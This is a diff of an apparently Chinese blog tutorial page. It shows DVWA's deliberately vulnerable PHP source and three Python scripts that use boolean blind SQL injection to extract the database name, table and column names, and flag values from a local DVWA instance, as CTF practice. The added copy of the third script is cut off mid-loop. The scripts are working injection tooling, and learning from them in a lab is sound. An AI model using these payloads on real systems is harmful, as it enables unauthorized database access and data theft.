@@ -152,9 +152,9 @@
 <p><br></p>
 <h2><span id="0x03-low-sql-injection-blind">0x03 Low SQL Injection (Blind)</span></h2><p><br></p>
 <h4><span id="1测试分析">1.测试分析</span></h4><p>经过简单的测试之后发现，页面只会出现两种回显，即</p>
-<pre><code>User ID exists in the database.
+<pre><code>  User ID exists in the database.
 </code></pre><p>   和</p>
-<pre><code>User ID is MISSING from the database.
+<pre><code>  User ID is MISSING from the database.
 </code></pre><table>
 <thead>
 <tr>
@@ -194,18 +194,200 @@
 <li>两者返回的内容随所构造的真假条件而不同，说明存在SQL盲注</li>
 <li>由最后两行构造真假条件返回对应不同的结果，可知存在字符型的SQL盲注。</li>
 </ul>
-<p>因为本文主要目的为脚本的编写，因此查看源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Submit'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $id = $_GET[ <span class="string">'id'</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database </span></span><br><span class="line">    $getid  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id';"</span>; </span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $getid ); <span class="comment">// Removed 'or die' to suppress mysql errors </span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results </span></span><br><span class="line">    $num = @mysqli_num_rows( $result ); <span class="comment">// The '@' character suppresses errors </span></span><br><span class="line">    <span class="keyword">if</span>( $num &gt; <span class="number">0</span> ) &#123; </span><br><span class="line">        <span class="comment">// Feedback for end user </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// User wasn't found, so the page wasn't! </span></span><br><span class="line">        header( $_SERVER[ <span class="string">'SERVER_PROTOCOL'</span> ] . <span class="string">' 404 Not Found'</span> ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;'</span>; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]))) ? <span class="keyword">false</span> : $___mysqli_res); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>因为本文主要目的为脚本的编写，因此查看源码：</p>
+<pre><code class="php">&lt;?php 
+
+if( isset( $_GET[ &#39;Submit&#39; ] ) ) { 
+    // Get input 
+    $id = $_GET[ &#39;id&#39; ]; 
+
+    // Check database 
+    $getid  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;;&quot;; 
+    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $getid ); // Removed &#39;or die&#39; to suppress mysql errors 
+
+    // Get results 
+    $num = @mysqli_num_rows( $result ); // The &#39;@&#39; character suppresses errors 
+    if( $num &gt; 0 ) { 
+        // Feedback for end user 
+        echo &#39;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#39;; 
+    } 
+    else { 
+        // User wasn&#39;t found, so the page wasn&#39;t! 
+        header( $_SERVER[ &#39;SERVER_PROTOCOL&#39; ] . &#39; 404 Not Found&#39; ); 
+
+        // Feedback for end user 
+        echo &#39;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#39;; 
+    } 
+
+    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); 
+} 
+
+?&gt; 
+</code></pre>
 <ul>
 <li>文本框输入并提交的形式，GET请求方式</li>
 <li>未作任何输入过滤和限制，攻击者可任意构造所想输入的sql查询</li>
 </ul>
 <p><br></p>
 <h4><span id="2脚本编写">2.脚本编写</span></h4><p>脚本中所用到的SQL语句与dvwa前面非盲注时语句差不多，可参考：<a href="https://blog.csdn.net/qq_42181428/article/details/87892132" target="_blank" rel="noopener">dvwa之SQL注入（1）</a></p>
-<p><strong>（1）脚本一：爆库名、表个数、表名</strong><br>我这里写的脚本是将当前数据库的所有表名都跑出来，实际在CTF比赛中，为节约时间可以不必这么做，因为一般包含flag的表名都会有特殊含义，只需要知道包含flag的表名即可。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 脚本里用到的参数</span></span><br><span class="line"><span class="comment"># databaseLen   库名长度</span></span><br><span class="line"><span class="comment"># databse_name  库名</span></span><br><span class="line"><span class="comment"># tableNum      表的数量</span></span><br><span class="line"><span class="comment"># tableLen      表名长度</span></span><br><span class="line"><span class="comment"># table_name    表名</span></span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://localhost:8081/dvwa/vulnerabilities/sqli_blind/'</span></span><br><span class="line"></span><br><span class="line">payloads = <span class="string">'abcdefghijklmnopqrstuvwxyz1234567890'</span> </span><br><span class="line"><span class="comment"># 这里为节约时间只包含小写字母与数字，实际可能还有大写字母与符号</span></span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">'Cookie'</span>: <span class="string">'security=low; PHPSESSID=cv0csro3c3kk4o03dia88nopc0'</span>&#125;</span><br><span class="line"><span class="comment"># 因为dvwa需要登陆，所以要在头部里加入cookie</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.先爆破库名的长度，以提高后续循环的效率,也可以不爆破长度，直接爆破名称（只要循环数大于长度）</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    databaseLen_payload = <span class="string">'?id=1\' and length(database())='</span>+str(j)+<span class="string">' %23&amp;Submit=Submit#'</span></span><br><span class="line">    <span class="comment"># 所有payload里的注释#要用url编码表示，因为这是直接添加在url里的</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'User ID exists in the database.'</span> <span class="keyword">in</span> s.get(url+databaseLen_payload, headers=headers).text:</span><br><span class="line">        databaseLen = j</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(<span class="string">'database_lenth: '</span>+str(databaseLen))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.爆库名</span></span><br><span class="line">databse_name = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,databaseLen+<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> payloads:</span><br><span class="line">        databse_payload = <span class="string">'?id=1\' and substr(database(),'</span>+str(j)+<span class="string">',1)=\''</span>+str(i)+<span class="string">'\' %23&amp;Submit=Submit#'</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'User ID exists in the database.'</span> <span class="keyword">in</span> s.get(url+databse_payload, headers=headers).text:</span><br><span class="line">            databse_name += i</span><br><span class="line">print(<span class="string">'database_name: '</span>+databse_name)</span><br><span class="line">        </span><br><span class="line"><span class="comment"># 3.爆破表的个数</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    tableNum_payload = <span class="string">'?id=1\' and (select count(table_name) from information_schema.tables where table_schema=database())='</span>+str(j)+<span class="string">' %23&amp;Submit=Submit#'</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'User ID exists in the database.'</span> <span class="keyword">in</span> s.get(url+tableNum_payload, headers=headers).text:</span><br><span class="line">        tableNum = j</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(<span class="string">'tableNum: '</span>+str(tableNum))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4.爆出所有的表名</span></span><br><span class="line"><span class="comment"># (1)爆出各个表名的长度</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,tableNum):</span><br><span class="line">    table_name = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">        tableLen_payload = <span class="string">'?id=1\' and length(substr((select table_name from information_schema.tables where table_schema=database() limit '</span>+str(j)+<span class="string">',1),1))='</span>+str(i)+<span class="string">' %23&amp;Submit=Submit#'</span></span><br><span class="line">                <span class="comment"># 用法substr('This is a test', 6) 返回'is a test'</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'User ID exists in the database.'</span> <span class="keyword">in</span> s.get(url+tableLen_payload, headers=headers).text:</span><br><span class="line">            tableLen = i</span><br><span class="line">            print(<span class="string">'table'</span>+str(j+<span class="number">1</span>)+<span class="string">'_length: '</span>+str(tableLen))</span><br><span class="line">          </span><br><span class="line">            <span class="comment"># (2)内部循环爆破每个表的表名</span></span><br><span class="line">            <span class="keyword">for</span> m <span class="keyword">in</span> range(<span class="number">1</span>,tableLen+<span class="number">1</span>):</span><br><span class="line">                <span class="keyword">for</span> n <span class="keyword">in</span> payloads: <span class="comment"># i在上个循环用过了</span></span><br><span class="line">                    table_payload = <span class="string">'?id=1\' and substr((select table_name from information_schema.tables where table_schema=database() limit '</span>+str(j)+<span class="string">',1),'</span>+str(m)+<span class="string">',1)=\''</span>+str(n)+<span class="string">'\' %23&amp;Submit=Submit#'</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="string">'User ID exists in the database.'</span> <span class="keyword">in</span> s.get(url+table_payload, headers=headers).text:</span><br><span class="line">                        table_name += n</span><br><span class="line">            print(<span class="string">'table'</span>+str(j+<span class="number">1</span>)+<span class="string">'_name: '</span>+table_name)</span><br></pre></td></tr></table></figure></p>
+<p><strong>（1）脚本一：爆库名、表个数、表名</strong><br>我这里写的脚本是将当前数据库的所有表名都跑出来，实际在CTF比赛中，为节约时间可以不必这么做，因为一般包含flag的表名都会有特殊含义，只需要知道包含flag的表名即可。</p>
+<pre><code class="python">#!/usr/bin/env python3
+# -*- coding: UTF-8 -*-
+
+import requests
+
+# 脚本里用到的参数
+# databaseLen   库名长度
+# databse_name  库名
+# tableNum      表的数量
+# tableLen      表名长度
+# table_name    表名
+
+s = requests.Session()
+
+url = &#39;http://localhost:8081/dvwa/vulnerabilities/sqli_blind/&#39;
+
+payloads = &#39;abcdefghijklmnopqrstuvwxyz1234567890&#39; 
+# 这里为节约时间只包含小写字母与数字，实际可能还有大写字母与符号
+
+headers = {&#39;Cookie&#39;: &#39;security=low; PHPSESSID=cv0csro3c3kk4o03dia88nopc0&#39;}
+# 因为dvwa需要登陆，所以要在头部里加入cookie
+
+# 1.先爆破库名的长度，以提高后续循环的效率,也可以不爆破长度，直接爆破名称（只要循环数大于长度）
+for j in range(1,50):
+    databaseLen_payload = &#39;?id=1\&#39; and length(database())=&#39;+str(j)+&#39; %23&amp;Submit=Submit#&#39;
+    # 所有payload里的注释#要用url编码表示，因为这是直接添加在url里的
+    if &#39;User ID exists in the database.&#39; in s.get(url+databaseLen_payload, headers=headers).text:
+        databaseLen = j
+        break
+print(&#39;database_lenth: &#39;+str(databaseLen))
+
+# 2.爆库名
+databse_name = &#39;&#39;
+for j in range(1,databaseLen+1):
+    for i in payloads:
+        databse_payload = &#39;?id=1\&#39; and substr(database(),&#39;+str(j)+&#39;,1)=\&#39;&#39;+str(i)+&#39;\&#39; %23&amp;Submit=Submit#&#39;
+
+        if &#39;User ID exists in the database.&#39; in s.get(url+databse_payload, headers=headers).text:
+            databse_name += i
+print(&#39;database_name: &#39;+databse_name)
+
+# 3.爆破表的个数
+for j in range(1,50):
+    tableNum_payload = &#39;?id=1\&#39; and (select count(table_name) from information_schema.tables where table_schema=database())=&#39;+str(j)+&#39; %23&amp;Submit=Submit#&#39;
+    if &#39;User ID exists in the database.&#39; in s.get(url+tableNum_payload, headers=headers).text:
+        tableNum = j
+        break
+print(&#39;tableNum: &#39;+str(tableNum))
+
+# 4.爆出所有的表名
+# (1)爆出各个表名的长度
+for j in range(0,tableNum):
+    table_name = &#39;&#39;
+    for i in range(1,50):
+        tableLen_payload = &#39;?id=1\&#39; and length(substr((select table_name from information_schema.tables where table_schema=database() limit &#39;+str(j)+&#39;,1),1))=&#39;+str(i)+&#39; %23&amp;Submit=Submit#&#39;
+                # 用法substr(&#39;This is a test&#39;, 6) 返回&#39;is a test&#39;
+        if &#39;User ID exists in the database.&#39; in s.get(url+tableLen_payload, headers=headers).text:
+            tableLen = i
+            print(&#39;table&#39;+str(j+1)+&#39;_length: &#39;+str(tableLen))
+
+            # (2)内部循环爆破每个表的表名
+            for m in range(1,tableLen+1):
+                for n in payloads: # i在上个循环用过了
+                    table_payload = &#39;?id=1\&#39; and substr((select table_name from information_schema.tables where table_schema=database() limit &#39;+str(j)+&#39;,1),&#39;+str(m)+&#39;,1)=\&#39;&#39;+str(n)+&#39;\&#39; %23&amp;Submit=Submit#&#39;
+                    if &#39;User ID exists in the database.&#39; in s.get(url+table_payload, headers=headers).text:
+                        table_name += n
+            print(&#39;table&#39;+str(j+1)+&#39;_name: &#39;+table_name)
+</code></pre>
 <p><strong>脚本一的运行结果如下：</strong><br><img src="/2019/03/02/以dvwa为例学习简单sql布尔盲注的详细脚本/20190302171115839.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="script1"></p>
-<p><strong>（2）脚本二：爆列名</strong><br>由脚本一得到的结果，很显然flag应该在‘flagishere’表中，因此脚本二只是针对此表来跑出其中所有的列名。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="comment"># 根据上个脚本得到的结果，此脚本用来跑出'flagishere'表中的字段</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">s = requests.Session()  <span class="comment"># 保持回话</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://localhost:8081/dvwa/vulnerabilities/sqli_blind/'</span></span><br><span class="line"></span><br><span class="line">payloads = <span class="string">'abcdefghijklmnopqrstuvwxyz1234567890'</span></span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">'Cookie'</span>: <span class="string">'security=low; PHPSESSID=cv0csro3c3kk4o03dia88nopc0'</span>&#125;</span><br><span class="line"><span class="comment"># 因为dvwa需要登陆，所以要在头部里加入cookie</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.判断flgishere表中字段数目</span></span><br><span class="line">columnNum = <span class="number">0</span> </span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    columnNum_payload = <span class="string">'?id=1\' and (select count(column_name) from information_schema.columns where table_name=\'flagishere\')='</span>+str(j)+<span class="string">' %23&amp;Submit=Submit#'</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'User ID exists in the database.'</span> <span class="keyword">in</span> s.get(url+columnNum_payload, headers=headers).text:</span><br><span class="line">        columnNum = j</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(<span class="string">'columnNum: '</span>+str(columnNum))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.爆出每个字段名的长度</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,columnNum):</span><br><span class="line">    column_name = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">        columnLen_payload = <span class="string">'?id=1\' and length(substr((select column_name from information_schema.columns where table_name=\'flagishere\' limit '</span>+str(j)+<span class="string">',1),1))='</span>+str(i)+<span class="string">' %23&amp;Submit=Submit#'</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'User ID exists in the database.'</span> <span class="keyword">in</span> s.get(url+columnLen_payload, headers=headers).text:</span><br><span class="line">            columnLen = i</span><br><span class="line">            print(<span class="string">'column'</span>+str(j+<span class="number">1</span>)+<span class="string">'_length: '</span>+str(columnLen))</span><br><span class="line">          </span><br><span class="line">            <span class="comment"># (2)内部循环爆破每个表的表名</span></span><br><span class="line">            <span class="keyword">for</span> m <span class="keyword">in</span> range(<span class="number">1</span>,columnLen+<span class="number">1</span>):</span><br><span class="line">                <span class="keyword">for</span> n <span class="keyword">in</span> payloads: <span class="comment"># i在上个循环用过了</span></span><br><span class="line">                    column_payload = <span class="string">'?id=1\' and substr((select column_name from information_schema.columns where table_name=\'flagishere\' limit '</span>+str(j)+<span class="string">',1),'</span>+str(m)+<span class="string">',1)=\''</span>+str(n)+<span class="string">'\' %23&amp;Submit=Submit#'</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="string">'User ID exists in the database.'</span> <span class="keyword">in</span> s.get(url+column_payload, headers=headers).text:</span><br><span class="line">                        column_name += n</span><br><span class="line">            print(<span class="string">'column'</span>+str(j+<span class="number">1</span>)+<span class="string">'_name: '</span>+column_name)</span><br></pre></td></tr></table></figure></p>
+<p><strong>（2）脚本二：爆列名</strong><br>由脚本一得到的结果，很显然flag应该在‘flagishere’表中，因此脚本二只是针对此表来跑出其中所有的列名。</p>
+<pre><code class="python">#!/usr/bin/env python3
+# -*- coding: UTF-8 -*-
+# 根据上个脚本得到的结果，此脚本用来跑出&#39;flagishere&#39;表中的字段
+
+import requests
+
+s = requests.Session()  # 保持回话
+
+url = &#39;http://localhost:8081/dvwa/vulnerabilities/sqli_blind/&#39;
+
+payloads = &#39;abcdefghijklmnopqrstuvwxyz1234567890&#39;
+
+headers = {&#39;Cookie&#39;: &#39;security=low; PHPSESSID=cv0csro3c3kk4o03dia88nopc0&#39;}
+# 因为dvwa需要登陆，所以要在头部里加入cookie
+
+# 1.判断flgishere表中字段数目
+columnNum = 0 
+for j in range(50):
+    columnNum_payload = &#39;?id=1\&#39; and (select count(column_name) from information_schema.columns where table_name=\&#39;flagishere\&#39;)=&#39;+str(j)+&#39; %23&amp;Submit=Submit#&#39;
+    if &#39;User ID exists in the database.&#39; in s.get(url+columnNum_payload, headers=headers).text:
+        columnNum = j
+        break
+print(&#39;columnNum: &#39;+str(columnNum))
+
+# 2.爆出每个字段名的长度
+for j in range(0,columnNum):
+    column_name = &#39;&#39;
+    for i in range(1,50):
+        columnLen_payload = &#39;?id=1\&#39; and length(substr((select column_name from information_schema.columns where table_name=\&#39;flagishere\&#39; limit &#39;+str(j)+&#39;,1),1))=&#39;+str(i)+&#39; %23&amp;Submit=Submit#&#39;
+        if &#39;User ID exists in the database.&#39; in s.get(url+columnLen_payload, headers=headers).text:
+            columnLen = i
+            print(&#39;column&#39;+str(j+1)+&#39;_length: &#39;+str(columnLen))
+
+            # (2)内部循环爆破每个表的表名
+            for m in range(1,columnLen+1):
+                for n in payloads: # i在上个循环用过了
+                    column_payload = &#39;?id=1\&#39; and substr((select column_name from information_schema.columns where table_name=\&#39;flagishere\&#39; limit &#39;+str(j)+&#39;,1),&#39;+str(m)+&#39;,1)=\&#39;&#39;+str(n)+&#39;\&#39; %23&amp;Submit=Submit#&#39;
+                    if &#39;User ID exists in the database.&#39; in s.get(url+column_payload, headers=headers).text:
+                        column_name += n
+            print(&#39;column&#39;+str(j+1)+&#39;_name: &#39;+column_name)
+</code></pre>
 <p><strong>脚本二运行结果如下：</strong><br><img src="/2019/03/02/以dvwa为例学习简单sql布尔盲注的详细脚本/20190302171725965.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="script2"></p>
-<p><strong>（3）脚本三：爆字段内容</strong><br>由脚本二的结果得知，真正的flag应该在’flagishere’表中的’flag’列下，所有脚本三就跑出该列下每条记录的值，也就是最终的flag(这里为了展示脚本可以爆多条记录的功能，所以自己设置了两个flag)<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据上个脚本得到的结果，此脚本用来跑出'flagishere'表中的字段名为'flag'</span></span><br><span class="line"><span class="comment"># 所以此脚本用来爆破flag字段中的内容</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">s = requests.Session()  <span class="comment"># 保持回话</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://localhost:8081/dvwa/vulnerabilities/sqli_blind/'</span></span><br><span class="line"></span><br><span class="line">payloads = <span class="string">'abcdefghijklmnopqrstuvwxyz1234567890\&#123;\&#125;'</span></span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">'Cookie'</span>: <span class="string">'security=low; PHPSESSID=cv0csro3c3kk4o03dia88nopc0'</span>&#125;</span><br><span class="line"><span class="comment"># 因为dvwa需要登陆，所以要在头部里加入cookie</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断flag字段中记录(行)数量</span></span><br><span class="line">rowNum = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    rowNum_payload = <span class="string">'?id=1\' and (select count(*) from flagishere)='</span>+str(j)+<span class="string">' %23&amp;Submit=Submit#'</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'User ID exists in the database.'</span> <span class="keyword">in</span> s.get(url+rowNum_payload, headers=headers).text:</span><br><span class="line">        rowNum = j</span><br><span class="line">print(<span class="string">"row_number: "</span>+str(rowNum))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 先爆每个字段值长度，以便控制循环，提高效率，也可省略此步骤，但要保证循环大于字段长度</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,rowNum+<span class="number">1</span>):</span><br><span class="line"></span><br><span class="line">    rowContent = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">       <span class="comment">#rowLen_payload = '?id=1\' and length(substr(select flag from flagishere limit '+str(j)+',1),1)='+str(i)+' %23&amp;Submit=Submit#'</span></span><br><span class="line">        rowLen_payload = <span class="string">'?id=1\' and length(substr((select flag from flagishere limit '</span>+str(j)+<span class="string">',1),1))='</span>+str(i)+<span class="string">' %23&amp;Submit=Submit#'</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'User ID exists in the database.'</span> <span class="keyword">in</span> s.get(url+rowLen_payload, headers=headers).text:    </span><br><span class="line">            rowLen = i</span><br><span class="line">            print(<span class="string">'row'</span>+str(j+<span class="number">1</span>)+<span class="string">'_length: '</span>+str(rowLen))</span><br><span class="line">            <span class="comment">#爆出个字段内容</span></span><br><span class="line">            <span class="keyword">for</span> m <span class="keyword">in</span> range(<span class="number">1</span>,rowLen+<span class="number">1</span>):</span><br><span class="line">                <span class="keyword">for</span> n <span class="keyword">in</span> payloads:</span><br><span class="line">                    rowContent_payload = <span class="string">'?id=1\' and substr((select flag from flagishere limit '</span>+str(j)+<span class="string">',1),'</span>+str(m)+<span class="string">',1)=\''</span>+str(n)+<span class="string">'\' %23&amp;Submit=Submit#'</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="string">'User ID exists in the database.'</span> <span class="keyword">in</span> s.get(url+rowContent_payload, headers=headers).text:</span><br><span class="line">                        rowContent += n  </span><br><span class="line">            print(<span class="string">'row'</span>+str(j+<span class="number">1</span>)+<span class="string">'_content: '</span>+rowContent)</span><br></pre></td></tr></table></figure></p>
+<p><strong>（3）脚本三：爆字段内容</strong><br>由脚本二的结果得知，真正的flag应该在’flagishere’表中的’flag’列下，所有脚本三就跑出该列下每条记录的值，也就是最终的flag(这里为了展示脚本可以爆多条记录的功能，所以自己设置了两个flag)</p>
+<pre><code class="python">#!/usr/bin/env python3
+# -*- coding: UTF-8 -*-
+
+# 根据上个脚本得到的结果，此脚本用来跑出&#39;flagishere&#39;表中的字段名为&#39;flag&#39;
+# 所以此脚本用来爆破flag字段中的内容
+
+import requests
+
+s = requests.Session()  # 保持回话
+
+url = &#39;http://localhost:8081/dvwa/vulnerabilities/sqli_blind/&#39;
+
+payloads = &#39;abcdefghijklmnopqrstuvwxyz1234567890\{\}&#39;
+
+headers = {&#39;Cookie&#39;: &#39;security=low; PHPSESSID=cv0csro3c3kk4o03dia88nopc0&#39;}
+# 因为dvwa需要登陆，所以要在头部里加入cookie
+
+# 判断flag字段中记录(行)数量
+rowNum = 0
+for j in range(50):
+    rowNum_payload = &#39;?id=1\&#39; and (select count(*) from flagishere)=&#39;+str(j)+&#39; %23&amp;Submit=Submit#&#39;
+    if &#39;User ID exists in the database.&#39; in s.get(url+rowNum_payload, headers=headers).text:
+        rowNum = j
+print(&quot;row_number: &quot;+str(rowNum))
+
+
+# 先爆每个字段值长度，以便控制循环，提高效率，也可省略此步骤，但要保证循环大于字段长度
+for j in range(0,rowNum+1):
+
+    rowContent = &#39;&#39;
